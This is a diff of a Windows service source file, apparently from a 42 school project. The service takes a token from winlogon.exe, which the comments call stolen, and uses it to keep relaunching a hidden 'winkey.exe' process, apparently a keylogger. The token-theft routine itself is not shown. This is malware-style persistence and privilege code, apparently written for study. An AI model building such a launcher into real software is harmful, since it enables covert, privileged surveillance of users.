@@ -6,7 +6,7 @@
 /*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/05/11 13:31:13 by vzurera-          #+#    #+#             */
-/*   Updated: 2025/05/13 13:11:37 by vzurera-         ###   ########.fr       */
+/*   Updated: 2025/05/14 00:05:13 by vzurera-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,20 +18,94 @@
 
 #pragma region "Variables"
 
-	SERVICE_STATUS          g_ServiceStatus;
-	SERVICE_STATUS_HANDLE   g_StatusHandle;
+	static SERVICE_STATUS          g_ServiceStatus;
+	static SERVICE_STATUS_HANDLE   g_StatusHandle;
+	static PROCESS_INFORMATION     g_ProcessInfo = {0};
+	static BOOL                    g_ProcessRunning = FALSE;
+
 	HANDLE                  g_ServiceStopEvent = NULL;
-	PROCESS_INFORMATION     g_ProcessInfo = {0};
-	BOOL                    g_ProcessRunning = FALSE;
 
 #pragma endregion
 
 #pragma region "Methods"
 
-	#pragma region "ReportStatusToSCMgr"
+	#pragma region "Close Process"
 
-		void ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
-			// Reporta el estado del servicio al Service Control Manager (SCM)
+		void CloseProcess() {
+			if (g_ProcessRunning && g_ProcessInfo.hProcess) {
+				// Open the termination event that the client process is waiting for
+				HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
+				if (hEvent) {
+					// Signal the event so the client knows it should terminate
+					SetEvent(hEvent);
+					
+					// Wait a reasonable time for the client to exit gracefully
+					DWORD waitResult = WaitForSingleObject(g_ProcessInfo.hProcess, 2000);
+					
+					// Close the termination event handle
+					CloseHandle(hEvent);
+					
+					// If the process did not exit after waiting, force termination
+					if (waitResult == WAIT_TIMEOUT) TerminateProcess(g_ProcessInfo.hProcess, 0);
+				} else TerminateProcess(g_ProcessInfo.hProcess, 0);
+				
+				CloseHandle(g_ProcessInfo.hProcess);
+				CloseHandle(g_ProcessInfo.hThread);
+				g_ProcessRunning = FALSE;
+			}
+		}
+
+	#pragma endregion
+
+	#pragma region "Main Loop"
+
+		void MainLoop(HANDLE dup_token_handle) {
+			BOOL keepRunning = TRUE;
+			while (keepRunning) {
+				// Check if service stop has been requested
+				if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0) { keepRunning = FALSE; break; }
+
+				// If the process is already running, check its state
+				if (g_ProcessRunning) {
+					DWORD exitCode = 0;
+					if (GetExitCodeProcess(g_ProcessInfo.hProcess, &exitCode)) {
+						if (exitCode != STILL_ACTIVE) {
+							CloseHandle(g_ProcessInfo.hProcess);
+							CloseHandle(g_ProcessInfo.hThread);
+							g_ProcessRunning = FALSE;
+						} else { Sleep(1000); continue; }
+					} else g_ProcessRunning = FALSE;
+				}
+
+				// If we get here, we need to start the process
+				STARTUPINFO si;
+				ZeroMemory(&si, sizeof(si));
+				si.cb = sizeof(si);
+				ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
+
+				// Start the process using winlogon.exe's token
+				if (CreateProcessAsUser(
+					dup_token_handle,	// Token stolen from winlogon.exe
+					Winkey_Path,		// Path to the executable
+					NULL,				// No need for av[1] here
+					NULL,				// Process security attributes
+					NULL,				// Thread security attributes
+					FALSE,				// Do not inherit handles
+					CREATE_NO_WINDOW,	// Create without a window
+					NULL,				// Use parent's environment
+					NULL,				// Use current directory
+					&si,				// Startup info
+					&g_ProcessInfo		// Process info
+				)) g_ProcessRunning = TRUE; else Sleep(5000);
+			}
+		}
+
+	#pragma endregion
+
+	#pragma region "Report Status"
+
+		void ReportStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
+			// Report the service status to the Service Control Manager (SCM)
 			g_ServiceStatus.dwCurrentState = dwCurrentState;
 			g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
 			g_ServiceStatus.dwWaitHint = dwWaitHint;
@@ -41,65 +115,31 @@
 
 	#pragma endregion
 
-	#pragma region "ServiceCtrlHandler"
+	#pragma region "Service Control"
 
-		// Handler para eventos de control de servicio (cuando SCM envía un comando)
-		VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
-			switch (dwCtrl) {
-				case SERVICE_CONTROL_STOP:
-					ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 3000);
+		// Handler for service control events (when SCM sends a command)
+		VOID WINAPI ServiceCtrl(DWORD dwCtrl) {
+			if (dwCtrl == SERVICE_CONTROL_STOP) {
+				ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);
 
-					// Señalizar evento para detener el bucle principal
-					if (g_ServiceStopEvent != NULL)  SetEvent(g_ServiceStopEvent);
+				// Signal the event to stop the main loop
+				if (g_ServiceStopEvent)  SetEvent(g_ServiceStopEvent);
 
-					// Terminar el proceso si está en ejecución
-					if (g_ProcessRunning && g_ProcessInfo.hProcess != NULL) {
-						// Abrir el evento de terminación que el proceso cliente está esperando
-						HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
-						if (hEvent) {
-							// Señalizar el evento para que el cliente sepa que debe terminar
-							SetEvent(hEvent);
-							
-							// Esperar un tiempo razonable para que el cliente se cierre limpiamente
-							DWORD waitResult = WaitForSingleObject(g_ProcessInfo.hProcess, 2000);
-							
-							// Cerrar el handle del evento de terminación
-							CloseHandle(hEvent);
-							
-							// Si el proceso no terminó después de esperar, forzar la terminación
-							if (waitResult == WAIT_TIMEOUT) {
-								TerminateProcess(g_ProcessInfo.hProcess, 0);
-							}
-						} else {
-							// Si no podemos abrir el evento, usar terminación forzosa como fallback
-							TerminateProcess(g_ProcessInfo.hProcess, 0);
-						}
-						
-						// Limpiar los handles
-						CloseHandle(g_ProcessInfo.hProcess);
-						CloseHandle(g_ProcessInfo.hThread);
-						g_ProcessRunning = FALSE;
-					}
-					break;
-				case SERVICE_CONTROL_INTERROGATE:
-					break;           
-				default:
-					break;
+				// Terminate the process if it's running
+				CloseProcess();
 			}
 		}
 
 	#pragma endregion
 
-	#pragma region "ServiceMain"
+	#pragma region "Service Main"
 
-		void WINAPI ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) {
-			(void) dwArgc;
-			(void) lpszArgv;
-			// Registrar el handler de control del servicio
-			g_StatusHandle = RegisterServiceCtrlHandler(Name, ServiceCtrlHandler);
+		void WINAPI ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) { (void) dwArgc; (void) lpszArgv;
+			// Register the service control handler
+			g_StatusHandle = RegisterServiceCtrlHandler(Name, ServiceCtrl);
 			if (g_StatusHandle == NULL) return;
 
-			// Inicialización del servicio
+			// Initialize the service status
 			g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
 			g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
 			g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
@@ -107,114 +147,22 @@
 			g_ServiceStatus.dwServiceSpecificExitCode = 0;
 			g_ServiceStatus.dwWaitHint = 0;
 
-			// Crear un evento para señalizar la detención del servicio
+			// Create an event to signal service stop
 			g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-			if (g_ServiceStopEvent == NULL) {
-				ReportStatusToSCMgr(SERVICE_STOPPED, GetLastError(), 0);
-				return;
-			}
+			if (g_ServiceStopEvent == NULL) { ReportStatus(SERVICE_STOPPED, GetLastError(), 0); return; }
 
-			// Reportar estado de "Corriendo"
-			ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0);
+			ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);
 
-		    // Impersonificar el token SYSTEM
-			if (!ImpersonateSystemToken()) {
-				ReportStatusToSCMgr(SERVICE_STOPPED, GetLastError(), 0);
-				return;
-			}
+			// Impersonate winlogon.exe token
+			HANDLE dup_token_handle = impersonate();
+			if (!dup_token_handle) return;
 
-			// Ruta al ejecutable winkey.exe en system32
-			const char* targetExe = "C:\\Windows\\winkey.exe";
-			
-			// Bucle principal del servicio
-			BOOL keepRunning = TRUE;
-			while (keepRunning) {
-				// Verificar si se ha solicitado detener el servicio
-				if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0) {
-					keepRunning = FALSE;
-					break;
-				}
+			// Manage winkey.exe
+			MainLoop(dup_token_handle);
 
-				// Si el proceso ya está en ejecución, revisar su estado
-				if (g_ProcessRunning) {
-					DWORD exitCode = 0;
-					if (GetExitCodeProcess(g_ProcessInfo.hProcess, &exitCode)) {
-						if (exitCode != STILL_ACTIVE) {
-							// El proceso terminó, cerrar handles
-							CloseHandle(g_ProcessInfo.hProcess);
-							CloseHandle(g_ProcessInfo.hThread);
-							g_ProcessRunning = FALSE;
-						} else {
-							// El proceso sigue en ejecución
-							Sleep(1000);
-							continue;
-						}
-					} else {
-						// Error al obtener código de salida
-						g_ProcessRunning = FALSE;
-					}
-				}
-
-				// Si llegamos aquí, necesitamos iniciar el proceso
-				STARTUPINFO si;
-				ZeroMemory(&si, sizeof(si));
-				ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
-				si.cb = sizeof(si);
-
-				// Iniciar el proceso
-				if (CreateProcess(
-					targetExe,       // Ruta al ejecutable
-					NULL,            // Argumentos de línea de comandos
-					NULL,            // Atributos de seguridad de proceso
-					NULL,            // Atributos de seguridad de thread
-					FALSE,           // No heredar handles
-					0,               // Sin flags adicionales
-					NULL,            // Usar entorno del padre
-					NULL,            // Usar directorio actual
-					&si,             // Info de inicio
-					&g_ProcessInfo   // Info del proceso
-				)) {
-					g_ProcessRunning = TRUE;
-				} else {
-					// Error al iniciar el proceso, esperar antes de reintentar
-					Sleep(5000);
-				}
-			}
-
-			// Si el proceso está en ejecución al salir del bucle, terminarlo
-			if (g_ProcessRunning && g_ProcessInfo.hProcess != NULL) {
-				// Abrir el evento de terminación que el proceso cliente está esperando
-				HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
-				if (hEvent) {
-					// Señalizar el evento para que el cliente sepa que debe terminar
-					SetEvent(hEvent);
-					
-					// Esperar un tiempo razonable para que el cliente se cierre limpiamente
-					DWORD waitResult = WaitForSingleObject(g_ProcessInfo.hProcess, 2000);
-					
-					// Cerrar el handle del evento de terminación
-					CloseHandle(hEvent);
-					
-					// Si el proceso no terminó después de esperar, forzar la terminación
-					if (waitResult == WAIT_TIMEOUT) {
-						TerminateProcess(g_ProcessInfo.hProcess, 0);
-					}
-				} else {
-					// Si no podemos abrir el evento, usar terminación forzosa como fallback
-					TerminateProcess(g_ProcessInfo.hProcess, 0);
-				}
-				
-				// Limpiar los handles
-				CloseHandle(g_ProcessInfo.hProcess);
-				CloseHandle(g_ProcessInfo.hThread);
-				g_ProcessRunning = FALSE;
-			}
-
-			// Limpiar
+			CloseProcess();
 			CloseHandle(g_ServiceStopEvent);
-
-			// Detener el servicio cuando termine su trabajo
-			ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0);
+			ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
 		}
 
 	#pragma endregion
